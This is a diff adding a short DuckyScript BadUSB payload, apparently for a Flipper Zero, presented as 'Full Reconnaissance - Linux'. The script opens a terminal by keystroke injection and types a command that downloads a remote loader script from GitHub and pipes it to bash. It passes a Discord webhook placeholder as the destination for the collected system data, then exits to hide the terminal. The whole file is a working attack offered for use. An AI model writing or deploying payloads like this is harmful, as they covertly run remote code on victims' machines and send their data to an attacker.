@@ -1,0 +1,21 @@
+REM ============================================================
+REM 🔍 Full Reconnaissance - Linux
+REM ============================================================
+REM Author: dil1thium
+REM Version: 3.0 (Modular)
+REM Target: Linux
+REM Category: Recon
+REM
+REM Comprehensive system reconnaissance.
+REM
+REM CONFIGURE:
+REM   Replace YOUR_DISCORD_WEBHOOK with your webhook URL
+REM ============================================================
+DELAY 500
+CTRL ALT t
+DELAY 1500
+STRING DC="YOUR_DISCORD_WEBHOOK" M="recon" bash -c 'curl -sL https://raw.githubusercontent.com/reschjonas/FlipperZero_BadUSB/main/remote-payloads/loaders/loader.sh|bash' &
+ENTER
+DELAY 500
+STRING exit
+ENTER
